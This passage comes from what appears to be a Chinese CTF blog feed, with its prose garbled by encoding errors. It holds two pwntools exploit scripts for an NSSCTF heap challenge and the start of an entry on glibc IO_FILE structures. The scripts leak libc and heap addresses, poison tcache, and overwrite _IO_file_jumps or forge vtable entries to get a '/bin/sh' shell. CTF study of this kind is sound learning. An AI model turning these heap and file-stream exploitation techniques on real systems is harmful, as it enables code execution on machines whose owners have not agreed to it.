class="hljs-string">&#x27;node4.anna.nssctf.cn:28174&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>menu = <span class="hljs-string">&#x27;Choice: &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br>    <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br><br>show(<span class="hljs-number">7</span>)<br><span class="hljs-comment"># main_arena = u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 96</span><br><span class="hljs-comment"># [+] ;40mmain_arena ---&gt; 0xa20 </span><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>lss(<span class="hljs-string">&quot;main_arena&quot;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>key = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br><br>libc_base = main_arena - libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]<br>_IO_file_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br><br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># for i in range(5):</span><br><span class="hljs-comment">#     add() #9 - 13</span><br><br>p1 = p64(key ^ _IO_file_jumps)<br>edit(<span class="hljs-number">6</span>, <span class="hljs-number">0x10</span>, p1)<br><br>add() <span class="hljs-comment">#14 #9</span><br>add() <span class="hljs-comment">#15 #10</span><br><br>one = [<span class="hljs-number">0xda861</span>, <span class="hljs-number">0xda864</span>, <span class="hljs-number">0xda867</span>]<br>one_gadget = one[<span class="hljs-number">1</span>] + libc_base<br>edit(<span class="hljs-number">10</span>, <span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(one_gadget))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ-â€”â€”-ä¼ªé€ ioç»“æ„ä½“"><a href="#æ–¹æ³•äºŒ-â€”â€”-ä¼ªé€ ioç»“æ„ä½“" class="headerlink" title="æ–¹æ³•äºŒ â€”â€” ä¼ªé€ ioç»“æ„ä½“"></a>æ–¹æ³•äºŒ â€”â€” ä¼ªé€ ioç»“æ„ä½“</h3><p>åŠ«æŒ_IO_new_file_xsputnè¿™ä¸ªå‡½æ•°ã€‚å½“ç„¶äº†ä¿®æ”¹_IO_new_file_overflowè¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå°±æ˜¯åˆ©ç”¨putsè¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./pwn10&#x27;</span><br>url = <span class="hljs-string">&#x27;node4.anna.nssctf.cn:28174&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>menu = <span class="hljs-string">&#x27;Choice: &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>, content)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) :<br>    add()  <span class="hljs-comment">#0 - 8</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>) :<br>    delete(i) <br><br>show(<span class="hljs-number">7</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br><br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span><br>libc_base = main_arena - <span class="hljs-number">0x1f2c60</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br>lss(<span class="hljs-string">&#x27;main_arena&#x27;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_file_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br><br>key = heap_base &gt;&gt; <span class="hljs-number">12</span><br>lss(<span class="hljs-string">&#x27;key&#x27;</span>)<br><br>target = key ^ IO_file_jumps<br>edit(<span class="hljs-number">6</span> , <span class="hljs-number">0x8</span> , p64(target))<br><br>add() <span class="hljs-comment">#9</span><br>add() <span class="hljs-comment">#10</span><br><br>fake = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>fake += p64(libc_base + <span class="hljs-number">0x83d80</span>) + p64(libc_base + <span class="hljs-number">0x84750</span>)<br>fake += p64(libc_base + <span class="hljs-number">0x84440</span>) + p64(libc_base + <span class="hljs-number">0x85520</span>)<br>fake += p64(libc_base + <span class="hljs-number">0x86600</span>) + p64(system_addr)<br><br><br><br>delete(<span class="hljs-number">9</span>)<br>target = key ^ stdout<br>edit(<span class="hljs-number">9</span> , <span class="hljs-number">0x8</span> , p64(target))<br>add() <span class="hljs-comment">#11</span><br>add() <span class="hljs-comment">#12</span><br>edit(<span class="hljs-number">12</span> , <span class="hljs-number">0x8</span> , <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br><br>pause()<br>p.sendlineafter(menu , <span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;10&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(fake)))<br>p.sendline(fake)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IO_FILEç»“æ„ä½“è®¤è¯†å’Œåˆ©ç”¨</title>
    <link href="/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E8%AE%A4%E8%AF%86IO_FILE/"/>
    <url>/2024/12/07/IO%E7%B3%BB%E5%88%97%E4%B9%8B%E8%AE%A4%E8%AF%86IO_FILE/</url>
    
    <content type="html"><![CDATA[<h1 id="IO-FILEç»“æ„ä½“å’ŒIOå‡½æ•°è®¤è¯†"><a href="#IO-FILEç»“æ„ä½“å’ŒIOå‡½æ•°è®¤è¯†" class="headerlink" title="IO_FILEç»“æ„ä½“å’ŒIOå‡½æ•°è®¤è¯†"></a>IO_FILEç»“æ„ä½“å’ŒIOå‡½æ•°è®¤è¯†</h1><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>åœ¨å­¦ä¹ å®Œsetcontextæ‰“ORWä¹‹åï¼Œçªç„¶æœ‰ç‚¹é¡¿æ‚Ÿçš„æ„Ÿè§‰ï¼Œå…³äºç»“æ„ä½“çš„ç›¸å…³åˆ©ç”¨ä¹Ÿä¸é‚£ä¹ˆç•æƒ§äº†ã€‚ä»Šå¤©å°±è¶çƒ­æ‰“é“å­¦ä¹ ä¸€ä¸‹ä¸€ä¸ªå¤§ä¸“é¢˜<strong>IO_FILE</strong></p><h2 id="IO-FILEç»“æ„ä½“è®¤è¯†"><a href="#IO-FILEç»“æ„ä½“è®¤è¯†" class="headerlink" title="IO_FILEç»“æ„ä½“è®¤è¯†"></a>IO_FILEç»“æ„ä½“è®¤è¯†</h2><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ç›¸å…³å®šä¹‰åœ¨libcio\libio.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿›ç¨‹ä¸­çš„ FILE ç»“æ„ä¼šé€šè¿‡_chain åŸŸå½¼æ­¤è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨å¤´éƒ¨ç”¨å…¨å±€å˜é‡_IO_list_all è¡¨ç¤ºï¼Œé€šè¿‡è¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰çš„ FILE ç»“æ„ã€‚</p><p>ä½†æ˜¯äº‹å®ä¸Š_IO_FILE ç»“æ„å¤–åŒ…è£¹ç€å¦ä¸€ç§ç»“æ„_IO_FILE_plusï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªé‡è¦çš„æŒ‡é’ˆ vtable æŒ‡å‘äº†ä¸€ç³»åˆ—å‡½æ•°æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ç›¸å…³å®šä¹‰åœ¨libio\libioP.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>è€Œvtable æ˜¯ IO_jump_t ç±»å‹çš„æŒ‡é’ˆï¼ŒIO_jump_t ä¸­ä¿å­˜äº†ä¸€äº›å‡½æ•°æŒ‡é’ˆï¼Œåœ¨åé¢æˆ‘ä»¬ä¼šçœ‹åˆ°åœ¨ä¸€ç³»åˆ—æ ‡å‡† IO å‡½æ•°ä¸­ä¼šè°ƒç”¨è¿™äº›å‡½æ•°æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨æ ‡å‡† I&#x2F;O åº“ä¸­ï¼Œæ¯ä¸ªç¨‹åºå¯åŠ¨æ—¶æœ‰ä¸‰ä¸ªæ–‡ä»¶æµæ˜¯è‡ªåŠ¨æ‰“å¼€çš„ï¼šstdinã€stdoutã€stderrã€‚å› æ­¤åœ¨åˆå§‹çŠ¶æ€ä¸‹ï¼Œ_IO_list_all æŒ‡å‘äº†ä¸€ä¸ªæœ‰è¿™äº›æ–‡ä»¶æµæ„æˆçš„é“¾è¡¨ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸‰ä¸ªæ–‡ä»¶æµä½äº libc.so çš„æ•°æ®æ®µã€‚è€Œæˆ‘ä»¬ä½¿ç”¨ fopen åˆ›å»ºçš„æ–‡ä»¶æµæ˜¯åˆ†é…åœ¨å †å†…å­˜ä¸Šçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span>;</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdin_</span>;</span><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdout_</span>;</span><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stderr_</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _LIBC</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_stdin ((_IO_FILE*)(&amp;_IO_2_1_stdin_))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_stderr ((_IO_FILE*)(&amp;_IO_2_1_stderr_))</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_stdin attribute_hidden;<br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_stdout attribute_hidden;<br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_stderr attribute_hidden;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><strong><code>struct _IO_FILE_plus</code></strong>:</p><ul><li>å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œä½†æ­¤å¤„æ˜¯å‰å‘å£°æ˜ï¼Œå…·ä½“å®ç°ä¸åœ¨å½“å‰ä»£ç ä¸­ã€‚</li><li><code>_IO_FILE_plus</code> æ˜¯ glibc ä¸­æ‰©å±• <code>struct _IO_FILE</code> çš„ç»“æ„ä½“ï¼Œç”¨äºç®¡ç†æ ‡å‡† I&#x2F;O æµã€‚</li></ul><p><strong><code>_IO_2_1_stdin_</code>ã€<code>_IO_2_1_stdout_</code>ã€<code>_IO_2_1_stderr_</code></strong>:</p><ul><li>å®ƒä»¬æ˜¯ <code>struct _IO_FILE_plus</code> 